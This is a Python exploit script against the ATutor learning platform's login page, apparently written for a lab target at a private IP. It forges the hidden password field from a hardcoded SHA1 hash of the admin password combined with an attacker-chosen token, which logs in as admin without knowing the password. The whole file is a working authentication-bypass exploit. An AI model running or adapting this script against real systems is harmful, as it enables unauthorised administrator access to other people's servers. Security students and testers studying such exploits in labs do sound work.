import sys
import hashlib
import requests




def gen_hash(passwd,token):
    m = hashlib.sha1()
    m.update(passwd+token)
    return m.hexdigest()


def login_with_hash(target,pass_hash):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = {
    'form_login_action':'true',
    'form_course_id':'0',
    'form_password_hidden':pass_hash,
    'p':'',
    'form_login':'admin',
    'token':'faye',
    'form_password':'',
    'submit':'login'
    }

    #proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
    

    try:
        s = requests.session()
        r = s.post(target,data=data,headers=headers,verify=False,timeout=10) # proxies=proxies if you need proxy to burp
        res = r.text
        if "You have logged in successfully." in res or "My Courses: My Start Page" in res:
            return True
        else:
            return False
    except Exception as e:
        return e


def main():
    admin_pass = "d033e22ae348aeb5660fc2140aec35850c4da997".encode()
    token = "faye".encode()
    target = "http://192.168.31.168:8080/atutor/login.php"

    hash = gen_hash(admin_pass,token)
    print("Final hashed pass = "+hash)
    if login_with_hash(target,hash):
        print("successful login!!!!")
    else:
        print("login fail")


if __name__ == '__main__':
    main()